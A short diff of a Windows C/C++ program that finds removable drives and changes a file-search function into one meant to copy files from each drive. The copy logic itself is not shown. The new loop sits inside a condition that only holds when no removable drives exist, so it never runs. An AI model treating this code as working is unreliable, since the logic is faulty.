@@ -11,7 +11,7 @@ int getDirName(TCHAR diskName[26][10]);
 //获取所有可移动硬盘的名称，返回可移动硬盘的个数
 int getAllDirRemoveble(TCHAR diskName[26][10], TCHAR removebleDiskName[26][10], int diskNumber);
 void convertsCharToTCHAR(char* strUsr, TCHAR* Name);
-void findfile(TCHAR* dirName);
+void copyFile(TCHAR* dirName);
 
 int main()
 {
@@ -23,9 +23,13 @@ int main()
 	removebleNumber = getAllDirRemoveble(diskName, removebleDiskName, diskNumber);
 	if (!removebleNumber)
 	{
-		 
+		for (int i = 0; i < removebleNumber; i++)
+		{
+			copyFile(removebleDiskName[i]);
+		}
+		 	
 	}
-	findfile(TEXT("E:\\"));
+
 	return 0;
 }
 
@@ -65,7 +69,7 @@ void convertsCharToTCHAR(char *strUsr,TCHAR *Name)
 	strcpy(Name, strUsr);
 #endif
 }
-void findfile(TCHAR* dirName)
+void copyFile(TCHAR* dirName)
 {
 	TCHAR fileName[260] = { 0 };
 	TCHAR fileNameAll[300] = { 0 };
